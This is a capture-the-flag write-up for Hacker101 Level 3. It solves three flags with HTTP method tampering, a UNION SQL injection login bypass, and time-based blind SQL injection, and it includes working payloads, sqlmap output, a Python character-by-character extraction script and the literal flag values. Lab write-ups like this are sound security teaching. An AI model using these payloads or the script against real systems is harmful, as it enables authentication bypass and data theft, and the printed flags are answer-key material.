# Hacker101 CTF — Level 3 Writeup

## Flag 1 — HTTP Method Manipulation (IDOR via OPTIONS/POST)

**Steps:**
1. Navigated to page 2 of the application.
2. Clicked **"Edit this page"** and intercepted the request using Burp Suite.
3. Changed the HTTP method from `GET` to `OPTIONS` to enumerate allowed methods.
   - Server response revealed allowed methods: `HEAD, GET, OPTIONS, POST`
4. Sent a `POST` request and modified the page number parameter from the current page to `3`.
5. The application processed the unauthorized `POST` request and returned the flag.

**Flag:**
```
^FLAG^2414fabe0d5a4921f0781be8f94c01b71c50ffcaa92614ab53f98501e4d71b96$FLAG$
```

**Vulnerability class:** Improper Access Control / HTTP Method Override

---

## Flag 2 — SQL Injection (UNION-based)

**Payload used in the username field:**
```sql
' UNION SELECT '123' AS password#
```

**Password field:**
```
123
```

**Explanation:**
The login query was vulnerable to UNION-based SQL injection. By closing the original query with `'` and appending a `UNION SELECT` statement that returns a static password value (`123`), the application's authentication check was bypassed — the injected query controlled the result returned for the "password" column, which matched the password supplied in the login form.

**Flag:**
```
^FLAG^7dfdcee8d07da42745eb17ceaddc2ecb1bb0512a86985c0af7f24f84d0680117$FLAG$
```

**Vulnerability class:** SQL Injection (UNION-based)

---

## Flag 3 — SQL Injection (Time-Based Blind)

**sqlmap detection details:**
```
Parameter: username (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: username=abc' AND (SELECT 1682 FROM (SELECT(SLEEP(5)))OAwp) AND 'ILLs'='ILLs&password=xyz
```

This payload confirmed the injection point by causing the database to pause for 5 seconds, proving that the `username` parameter executes injected SQL without proper sanitization — even though no data was reflected directly in the response (hence "blind").

### Manual / Scripted Extraction (Python)

When `sqlmap` is blocked (e.g. by a WAF) or a custom extraction is needed, the flag can be extracted character-by-character using a binary/linear search with `SLEEP()`-based timing as an oracle.

```python
import requests
import time

url = "http://<TARGET_URL>"  # Replace with target URL
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-"
flag = ""

print("[*] Extracting flag...")
for position in range(1, 50):  # Adjust loop range based on expected flag length
    character_found = False

    for char in alphabet:
        # MySQL time-based payload injection into username
        payload = (
            f"abc' AND (SELECT IF(ORD(SUBSTRING((SELECT flag FROM flags LIMIT 1),"
            f"{position},1))={ord(char)},SLEEP(5),0)) AND '1'='1"
        )
        data = {
            "username": payload,
            "password": "xyz"
        }

        start_time = time.time()
        try:
            response = requests.post(url, data=data, timeout=7)
        except requests.exceptions.Timeout:
            # If a timeout occurs, it confirms the database slept
            pass

        duration = time.time() - start_time

        # If response took 5 or more seconds, the character matches
        if duration >= 5:
            flag += char
            print(f"[+] Found char {position}: {char} -> Current Flag: {flag}")
            character_found = True

            if char == "}":  # Stop if end of flag format is reached
                print(f"[!] Target Flag Extracted: {flag}")
                exit()
            break

    if not character_found:
        print("[!] No more characters found or extraction completed.")
        break
```

**Core confirming payload:**
```sql
abc' AND (SELECT 1682 FROM (SELECT(SLEEP(5)))OAwp) AND 'ILLs'='ILLs
```

**Vulnerability class:** SQL Injection (Time-Based Blind)

---

## Summary Table

| Flag | Technique | Vulnerability Class |
|------|-----------|----------------------|
| 1 | HTTP method tampering (GET → OPTIONS → POST) | Improper Access Control |
| 2 | UNION-based SQL Injection | SQL Injection |
| 3 | Time-based Blind SQL Injection | SQL Injection |
